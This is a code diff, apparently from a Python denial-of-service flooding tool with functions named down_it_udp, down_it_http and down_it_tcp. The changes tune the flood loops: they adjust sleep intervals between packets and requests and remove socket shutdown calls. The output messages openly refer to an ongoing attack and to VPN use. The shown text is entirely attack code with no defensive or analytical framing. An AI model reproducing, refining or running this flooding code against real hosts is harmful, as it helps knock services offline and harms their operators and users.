@@ -81,7 +81,7 @@ def down_it_udp():
                 thread = threading.Thread(target=connect_host)
                 thread.daemon = True
                 thread.start()
-        time.sleep(.01)
+        time.sleep(.05)
 
 
 def down_it_http():
@@ -112,7 +112,7 @@ def down_it_http():
         else:
             print('\033[92m HTTP-Request was done \033[0;0m')
 
-        time.sleep(.01)
+        time.sleep(.05)
 
 
 def down_it_tcp():
@@ -125,18 +125,16 @@ def down_it_tcp():
             s.settimeout(5)
             s.connect((host, int(port)))
             if s.sendto(packet, (host, int(port))):
-                s.shutdown(1)
                 print('\033[92m TCP Packet was sent \033[0;0m')
             else:
-                s.shutdown(1)
                 print("\033[91mshut<->down\033[0m")
-            time.sleep(.1)
+            time.sleep(.05)
         except Exception as e:
             if error_debug:
                 print("\033[91mError: " + str(e) + ".\033[0m")
             print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
                   " Program will continue working.\033[0m")
-            time.sleep(.1)
+            time.sleep(.05)
 
 
 def usage():
@@ -267,4 +265,4 @@ if __name__ == '__main__':
         thrs[i].start()
 
     while True:
-        time.sleep(.1)
+        time.sleep(.2)
